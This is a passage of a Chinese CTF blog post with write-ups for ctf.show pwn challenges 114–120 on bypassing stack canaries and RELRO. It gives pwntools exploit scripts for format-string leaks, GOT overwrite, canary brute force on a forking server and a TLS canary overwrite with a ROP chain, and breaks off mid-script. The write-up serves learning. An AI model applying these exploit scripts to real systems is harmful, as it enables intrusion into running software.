<p><img src="/2024/09/20/pwn111-134bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20240909091901412.png" alt="image-20240909091901412"></p>
<p>主函数如上图</p>
<p>首先看到一个不认识的函数，点进去看看，发现有惊喜。</p>
<p><img src="/2024/09/20/pwn111-134bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20240909092023376.png" alt="image-20240909092023376"></p>
<p>这个函数的意思是只要段错误就从错误输出中输出flag，所以只要故意溢出让程序崩溃就好了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;,28303)</span><br><span class="line">elf = ELF(&#x27;../pwn114&#x27;)</span><br><span class="line"></span><br><span class="line">offset = 1000</span><br><span class="line">payload = cyclic(offset)</span><br><span class="line"></span><br><span class="line">p.sendline(&#x27;Yes&#x27;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h5 id="signal函数知识补充"><a href="#signal函数知识补充" class="headerlink" title="signal函数知识补充"></a>signal函数知识补充</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">在 C/C++ 编程中，`signal(11, sigsegv_handler);` 这行代码的作用是设置一个自定义的信号处理函数，当程序收到 **信号 11 (SIGSEGV)** 时触发。</span><br><span class="line"></span><br><span class="line">### 详细解释</span><br><span class="line"></span><br><span class="line">1. **`signal` 函数**:</span><br><span class="line">   - `signal` 是一个系统调用，用于捕捉信号并指定如何处理这些信号。它可以接受两个参数：</span><br><span class="line">     - **第一个参数** 是信号的编号或符号，代表程序收到某种特定的信号。</span><br><span class="line">     - **第二个参数** 是信号处理函数的指针，当指定的信号发生时，系统将调用这个函数来处理信号。</span><br><span class="line"></span><br><span class="line">2. **`11` (SIGSEGV)**:</span><br><span class="line">   - **`11`** 是信号 **SIGSEGV** 的编号，表示**段错误**（Segmentation Fault）。当程序试图访问无效的内存地址时，操作系统会向该进程发送 SIGSEGV 信号。</span><br><span class="line">   - 这是程序常见的崩溃原因之一，例如在尝试读写未分配的内存区域时。</span><br><span class="line"></span><br><span class="line">3. **`sigsegv_handler`**:</span><br><span class="line">   - **`sigsegv_handler`** 是自定义的信号处理函数，它会在收到 SIGSEGV 信号时执行。这个函数可以定义如何响应段错误，比如输出调试信息、记录日志，或者优雅地终止程序。</span><br><span class="line"></span><br><span class="line">### 示例代码</span><br><span class="line"></span><br><span class="line">```c</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;signal.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">// 自定义的 SIGSEGV 处理函数</span><br><span class="line">void sigsegv_handler(int signum) &#123;</span><br><span class="line">    printf(&quot;Caught SIGSEGV (signal %d), segmentation fault occurred!\n&quot;, signum);</span><br><span class="line">    exit(1);  // 终止程序</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    // 注册信号处理函数</span><br><span class="line">    signal(11, sigsegv_handler);</span><br><span class="line"></span><br><span class="line">    // 故意触发段错误</span><br><span class="line">    int *ptr = NULL;</span><br><span class="line">    *ptr = 42;  // 尝试向空指针写入，导致段错误</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line">```</span><br><span class="line"></span><br><span class="line">### 解释</span><br><span class="line">- **`signal(11, sigsegv_handler);`**: 这一行注册了 `sigsegv_handler` 函数，使其在程序收到 SIGSEGV 信号时被调用。也就是当程序触发段错误时，不是直接崩溃，而是先执行 `sigsegv_handler`。</span><br><span class="line">- **`int *ptr = NULL; *ptr = 42;`**: 这里通过将值写入一个空指针（`NULL`）的位置，故意触发段错误。</span><br><span class="line">- **`sigsegv_handler`**: 当段错误发生时，操作系统发送信号 11，触发 `sigsegv_handler`，输出错误信息并终止程序。</span><br><span class="line"></span><br><span class="line">### 使用场景</span><br><span class="line">- **调试程序**: 捕获段错误后，输出调试信息，帮助开发者找出问题的来源。</span><br><span class="line">- **防止程序崩溃**: 在某些情况下，你可以通过处理信号来记录信息或清理资源，防止程序因为段错误直接崩溃。</span><br><span class="line">- **安全措施**: 在安全敏感的场景下，可以在信号处理函数中记录崩溃时的状态，防止崩溃时留下漏洞。</span><br><span class="line"></span><br><span class="line">### 总结</span><br><span class="line">`signal(11, sigsegv_handler);` 用于捕获段错误（SIGSEGV 信号），并在段错误发生时调用自定义的处理函数 `sigsegv_handler`。这样可以在段错误发生时，优雅地处理错误，避免程序直接崩溃，同时输出有用的调试信息。</span><br></pre></td></tr></table></figure>

<h4 id="pwn115"><a href="#pwn115" class="headerlink" title="pwn115"></a>pwn115</h4><p>tips：bypass canary 姿势1</p>
<p><img src="/2024/09/20/pwn111-134bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20240909094743035.png" alt="image-20240909094743035"></p>
<p>32bit，开启nx,pie，relro为partial</p>
<p><img src="/2024/09/20/pwn111-134bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20240909095027348.png" alt="image-20240909095027348"></p>
<p>漏洞很明显，使用printf函数泄露出canary的值，然后利用漏洞函数getshell</p>
<p>先计算一下偏移</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaaa-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p</span><br></pre></td></tr></table></figure>

<p>offset &#x3D; 5</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;,28236)</span><br><span class="line">#p = process(&#x27;../pwn115&#x27;)</span><br><span class="line">#p = gdb.debug(&#x27;../pwn115&#x27;,&#x27;b main&#x27;)</span><br><span class="line">elf = ELF(&#x27;../pwn115&#x27;)</span><br><span class="line"></span><br><span class="line">backdoor = elf.sym[&#x27;backdoor&#x27;]</span><br><span class="line"></span><br><span class="line">offset = 5</span><br><span class="line"># (0xd4 - 0xc)/4 = 0x32 = 50 </span><br><span class="line">payload = &quot;%&#123;&#125;$p&quot;.format(offset + 50)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(&#x27;0x&#x27;)</span><br><span class="line">canary = int(p.recv(8),16)</span><br><span class="line">print(hex(canary))</span><br><span class="line"></span><br><span class="line">payload = cyclic(0xd4-0xc) + p32(canary) + cyclic(12) + p32(backdoor)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>官方wp用的大概是printf输出到\x00的特性吧，而且还有一些偏移之类的东西，不太懂，不过既然做出来我也懒得理会了。</p>
<h4 id="pwn116"><a href="#pwn116" class="headerlink" title="pwn116"></a>pwn116</h4><p><img src="/2024/09/20/pwn111-134bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20240909152500366.png" alt="image-20240909152500366"></p>
<p>开启nx和canary，relro为partial，32位</p>
<p><img src="/2024/09/20/pwn111-134bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20240909153028794.png" alt="image-20240909153028794"></p>
<p>跟上一题没啥区别吧</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;,28226)</span><br><span class="line">#p = process(&#x27;../pwn116&#x27;)</span><br><span class="line">#p = gdb.debug(&#x27;../pwn116&#x27;,&#x27;b main&#x27;)</span><br><span class="line">elf = ELF(&#x27;../pwn116&#x27;)</span><br><span class="line"></span><br><span class="line">backdoor = elf.sym[&#x27;qwerasd&#x27;]</span><br><span class="line"></span><br><span class="line">offset = 7</span><br><span class="line">payload = &quot;%&#123;&#125;$p&quot;.format(offset + 8)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(&#x27;0x&#x27;)</span><br><span class="line">canary = int(p.recv(8),16)</span><br><span class="line">print(hex(canary))</span><br><span class="line"></span><br><span class="line">payload = cyclic(0x2c-0xc) + p32(canary) + cyclic(12) + p32(backdoor)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>ez，直接拿下</p>
<h4 id="pwn117"><a href="#pwn117" class="headerlink" title="pwn117"></a>pwn117</h4><p><img src="/2024/09/20/pwn111-134bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20240909153828972.png" alt="image-20240909153828972"></p>
<p>64bit，relro为partial，canary和nx为yes</p>
<p><img src="/2024/09/20/pwn111-134bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20240909225121348.png" alt="image-20240909225121348"></p>
<p>解题思路：简单来说，就是修改__libc_argv[0]的值为flag的值，达到输出flag的目的，在后文的知识补充的有提到。</p>
<p>但是，这里有一个很致命的点，那就是这道题由于是改编过来的题，我怀疑改编的时候是照抄的参数，所以offset才是504，实际上应该计算的是__libc_argv[0]到buf之间的间隔。</p>
<p>至于为什么得出这个结论，是因为，连接远程服务器的时候溢出，是不会输出程序的名称的，而理论上stack_chk_fail应该输出崩溃的程序的名称，所以说这道题应该是抄的时候没有改好。（md，纠结了我好久）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;,28271)</span><br><span class="line">#p = process(&#x27;../pwn117&#x27;)</span><br><span class="line">#p = gdb.debug(&#x27;../pwn117&#x27;,&#x27;b main&#x27;)</span><br><span class="line">elf = ELF(&#x27;../pwn117&#x27;)</span><br><span class="line">flag = 0x6020a0</span><br><span class="line">offset = 504</span><br><span class="line">payload = cyclic(offset) + p64(flag)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="stack-chk-fail知识补充"><a href="#stack-chk-fail知识补充" class="headerlink" title="stack_chk_fail知识补充"></a>stack_chk_fail知识补充</h5><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zuoanfengxi/p/12610567.html%EF%BC%8C%E5%8F%AF%E4%BB%A5%E7%9C%8B%E8%BF%99%E7%AF%87%E6%96%87%E7%AB%A0%EF%BC%8C%E5%86%99%E5%BE%97%E8%BF%98%E6%8C%BA%E8%AF%A6%E7%BB%86%E7%9A%84%E3%80%82">https://www.cnblogs.com/zuoanfengxi/p/12610567.html，可以看这篇文章，写得还挺详细的。</a></p>
<p><a target="_blank" rel="noopener" href="https://www.ascotbe.com/2021/03/26/StackOverflow_Linux_0x03/#ssp-stack-smashing-protector%E8%BF%99%E4%B8%AA%E4%BD%9C%E8%80%85%E5%86%99%E5%BE%97%E4%B9%9F%E5%BE%88%E5%A5%BD%EF%BC%8C%E5%85%B7%E4%BD%93%E7%9C%8Bssp%E7%9A%84%E9%83%A8%E5%88%86">https://www.ascotbe.com/2021/03/26/StackOverflow_Linux_0x03/#ssp-stack-smashing-protector这个作者写得也很好，具体看ssp的部分</a></p>
<h4 id="pwn118"><a href="#pwn118" class="headerlink" title="pwn118"></a>pwn118</h4><p><img src="/2024/09/20/pwn111-134bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20240909230152664.png" alt="image-20240909230152664"></p>
<p>32位，开启nx和canary，relro为no</p>
<p><img src="/2024/09/20/pwn111-134bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20240909231041302.png" alt="image-20240909231041302"></p>
<p><img src="/2024/09/20/pwn111-134bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20240909231053475.png" alt="image-20240909231053475"></p>
<p>可以看到<code>__stack_chk_fail</code>也是一个延迟绑定的函数，此处可以使用类似ret2dlreslove的方法，将<code>__stack_chk_fail</code>的指向修改为后门函数，达到调用后门函数的目的。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;,28200)</span><br><span class="line">#p = process(&#x27;../pwn118&#x27;)</span><br><span class="line">#p = gdb.debug(&#x27;../pwn118&#x27;,&#x27;b main&#x27;)</span><br><span class="line">elf = ELF(&#x27;../pwn118&#x27;)</span><br><span class="line"></span><br><span class="line">stack_chk_fail_got = elf.got[&#x27;__stack_chk_fail&#x27;]</span><br><span class="line">get_flag = elf.sym[&#x27;get_flag&#x27;]</span><br><span class="line"></span><br><span class="line">offset = 7</span><br><span class="line">payload = fmtstr_payload(offset,&#123;stack_chk_fail_got:get_flag&#125;)</span><br><span class="line">payload = payload.ljust(0x5c,&#x27;a&#x27;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="pwn119"><a href="#pwn119" class="headerlink" title="pwn119"></a>pwn119</h4><p><img src="/2024/09/20/pwn111-134bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20240910002827031.png" alt="image-20240910002827031"></p>
<p>32bit，relro为partial，开启了canary和nx</p>
<p><img src="/2024/09/20/pwn111-134bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20240910003136976.png" alt="image-20240910003136976"></p>
<p><img src="/2024/09/20/pwn111-134bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20240910003144291.png" alt="image-20240910003144291"></p>
<p>这道题的意思就是爆破一下</p>
<p><img src="/2024/09/20/pwn111-134bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20240910003503271.png" alt="image-20240910003503271"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;,28257)</span><br><span class="line">#p = process(&#x27;../pwn119&#x27;)</span><br><span class="line">#p = gdb.debug(&#x27;../pwn119&#x27;,&#x27;b main&#x27;)</span><br><span class="line">elf = ELF(&#x27;../pwn119&#x27;)</span><br><span class="line"></span><br><span class="line">canary = b&#x27;\x00&#x27;</span><br><span class="line">backdoor = elf.sym[&#x27;backdoor&#x27;]</span><br><span class="line"></span><br><span class="line">offset = 0x70 - 0xc</span><br><span class="line">for i in range(3):</span><br><span class="line">	for j in range(0,256):</span><br><span class="line">		print(b&quot;idx:&quot; + i.to_bytes(1,byteorder=&#x27;little&#x27;) + b&quot;:&quot; + j.to_bytes(1,byteorder=&#x27;little&#x27;))</span><br><span class="line">		payload = cyclic(offset) + canary + j.to_bytes(1,byteorder=&#x27;little&#x27;)</span><br><span class="line">		p.send(payload)</span><br><span class="line">		sleep(0.3)</span><br><span class="line">		text = p.recv()</span><br><span class="line">		print(text)</span><br><span class="line">		if b&quot;stack smashing detected&quot; not in text:</span><br><span class="line">			canary += j.to_bytes(1,byteorder=&#x27;little&#x27;)</span><br><span class="line">			break</span><br><span class="line">print(hex(u32(canary)))</span><br><span class="line">payload = cyclic(offset) + canary + cyclic(0xc) + p32(backdoor)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>注意发送的时候使用send而不是sendline</p>
<h5 id="fork知识补充"><a href="#fork知识补充" class="headerlink" title="fork知识补充"></a>fork知识补充</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">这段代码的作用是在一个无限循环中创建新的进程，并尝试使用 `fork()` 创建子进程。以下是对这段代码的详细解释：</span><br><span class="line"></span><br><span class="line">### 代码逐行解析</span><br><span class="line"></span><br><span class="line">```c</span><br><span class="line">while ( 1 )  // 无限循环</span><br><span class="line">&#123;</span><br><span class="line">    puts(&quot;Try PWN Me!&quot;);  // 打印字符串 &quot;Try PWN Me!&quot;</span><br><span class="line">    </span><br><span class="line">    if ( !fork() )  // 调用 fork() 创建子进程，fork() 返回 0 表示子进程</span><br><span class="line">        break;  // 如果是子进程，跳出循环</span><br><span class="line">        </span><br><span class="line">    wait(0);  // 父进程等待子进程结束</span><br><span class="line">&#125;</span><br><span class="line">```</span><br><span class="line"></span><br><span class="line">### 详细解释</span><br><span class="line"></span><br><span class="line">1. **`while (1)`**:</span><br><span class="line">   - 这是一个无限循环，意味着程序会一直执行其中的代码块，直到满足某个条件退出。</span><br><span class="line"></span><br><span class="line">2. **`puts(&quot;Try PWN Me!&quot;);`**:</span><br><span class="line">   - 每次进入循环时，程序都会输出 `&quot;Try PWN Me!&quot;`。</span><br><span class="line"></span><br><span class="line">3. **`if ( !fork() )`**:</span><br><span class="line">   - `fork()` 是一个系统调用，用于创建一个新的进程，称为 **子进程**。调用 `fork()` 时，操作系统会创建一个新的进程，该进程几乎是父进程的完全副本。该函数会返回两次：</span><br><span class="line">     - 在 **父进程** 中，`fork()` 返回的是 **子进程的 PID（大于 0）**。</span><br><span class="line">     - 在 **子进程** 中，`fork()` 返回的是 **0**。</span><br><span class="line">   </span><br><span class="line">   因此，`if ( !fork() )` 的意思是：**如果是子进程（`fork()` 返回 0），则进入 `if` 语句块**，并执行 `break` 跳出循环。</span><br><span class="line"></span><br><span class="line">4. **`break;`**:</span><br><span class="line">   - 如果当前进程是子进程（`fork()` 返回 0），则会执行 `break;`，这会导致子进程退出循环，不再继续创建新的进程。</span><br><span class="line"></span><br><span class="line">5. **`wait(0);`**:</span><br><span class="line">   - `wait(0)` 是一个阻塞式调用，父进程在这里等待子进程终止。`wait()` 会等待任意一个子进程结束，然后父进程继续执行。</span><br><span class="line">   - 在这段代码中，父进程每次等待子进程结束后，会重新进入循环并创建下一个子进程。</span><br><span class="line"></span><br><span class="line">### 程序的运行逻辑</span><br><span class="line"></span><br><span class="line">1. 程序首先进入无限循环。</span><br><span class="line">2. 每次循环中，父进程都会调用 `puts()` 输出 `&quot;Try PWN Me!&quot;`。</span><br><span class="line">3. 然后，程序调用 `fork()`：</span><br><span class="line">   - 如果 `fork()` 返回 0（即子进程），子进程会执行 `break;` 退出循环，不再继续创建新的子进程。</span><br><span class="line">   - 如果 `fork()` 返回非 0（即父进程），父进程会调用 `wait(0);` 等待子进程结束。</span><br><span class="line">4. 父进程等待子进程结束后，重新进入循环，继续创建新的子进程。</span><br><span class="line"></span><br><span class="line">### 程序的特点</span><br><span class="line"></span><br><span class="line">- **父进程的行为**：父进程在每次循环中输出 `&quot;Try PWN Me!&quot;`，创建子进程，并等待子进程结束后再次进入循环。</span><br><span class="line">- **子进程的行为**：子进程在创建后，会退出循环，不再继续创建新的子进程。</span><br><span class="line">- **循环创建子进程**：父进程会不断创建新的子进程，每次子进程创建后，父进程会等待它结束，之后再次创建新的子进程。</span><br><span class="line"></span><br><span class="line">### 程序的实际效果</span><br><span class="line"></span><br><span class="line">1. **父进程持续输出**：父进程每次循环都会输出 `&quot;Try PWN Me!&quot;`。</span><br><span class="line">2. **子进程只执行一次循环**：子进程在创建后，会退出循环。</span><br><span class="line">3. **父进程不断创建子进程**：父进程通过 `fork()` 不断创建子进程，每创建一个子进程后，父进程等待子进程结束，然后继续创建新的子进程。</span><br><span class="line"></span><br><span class="line">### 可能的应用场景</span><br><span class="line"></span><br><span class="line">1. **服务进程**：这种模式在服务器中较为常见，父进程不断创建子进程来处理客户端请求，每个子进程处理完请求后即退出，而父进程则继续监听和创建新的子进程。</span><br><span class="line">2. **调试和漏洞利用（CTF 场景）**：在某些漏洞利用场景下（如 CTF 竞赛），父进程可以通过这种方式不断创建子进程，等待攻击者通过子进程进行攻击。</span><br><span class="line"></span><br><span class="line">### 总结</span><br><span class="line"></span><br><span class="line">这段代码会在无限循环中不断创建子进程，子进程只执行一次循环后退出，而父进程会等待子进程结束并继续创建新的子进程。</span><br></pre></td></tr></table></figure>

<h4 id="pwn120"><a href="#pwn120" class="headerlink" title="pwn120"></a>pwn120</h4><p><img src="/2024/09/20/pwn111-134bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20240910111722740.png" alt="image-20240910111722740"></p>
<p>64bit，relro为full，canary和nx为yes</p>
<p><img src="/2024/09/20/pwn111-134bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20240910140632270.png" alt="image-20240910140632270"></p>
<p>这道题和pwn89很类似，通过覆盖TCB来实现对canary的绕过。</p>
<p><img src="/2024/09/20/pwn111-134bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20240910140815184.png" alt="image-20240910140815184"></p>
<p>这波啊，这波是我抄我自己。</p>
<p>参考链接：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/13074?time__1311=GqmhBKqIxGxBMx+oxfxmq=ba34GK4vYx">TLS_bypass_Canary - 先知社区 (aliyun.com)</a></p>
<p>所以说，只要溢出得足够多就可以覆盖掉canary。</p>
<p><img src="/2024/09/20/pwn111-134bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20240910144404239.png" alt="image-20240910144404239"></p>
<p>可以看到，在-008和+818两个位置都是canary，大概的间隔在一页之内（0x1000个字节）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">#p = process(&#x27;../pwn120&#x27;)</span><br><span class="line">#p = gdb.debug(&#x27;../pwn120&#x27;,&#x27;b main&#x27;)</span><br><span class="line">p = remote(&#x27;pwn.challenge.ctf.show&#x27;,&#x27; 28291&#x27;)</span><br><span class="line">context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">elf = ELF(&#x27;../pwn120&#x27;)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = 0x400be3</span><br><span class="line">pop_rsi_r15_ret = 0x400be1</span><br><span class="line">leave_ret = 0x400ada</span><br><span class="line">puts_got = elf.got[&#x27;puts&#x27;]</span><br><span class="line">puts_plt = elf.sym[&#x27;puts&#x27;]</span><br><span class="line">read_plt = elf.sym[&#x27;read&#x27;]</span><br><span class="line">bss_addr = 0x602f00</span><br><span class="line"></span><br><span class="line">payload = b&#x27;a&#x27; * 0x510 + p64(bss_addr - 0x8)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(0)</span><br><span class="line">payload += p64(pop_rsi_r15_ret) + p64(bss_addr) + p64(0) + p64(read_plt)</span><br><span class="line">payload += p64(leave_ret)</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(0x1000,b&#x27;a&#x27;)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&quot;How much do you want to send this time?\n&quot;,str(0x1000))</span><br><span class="line">sleep(0.5)</span><br><span 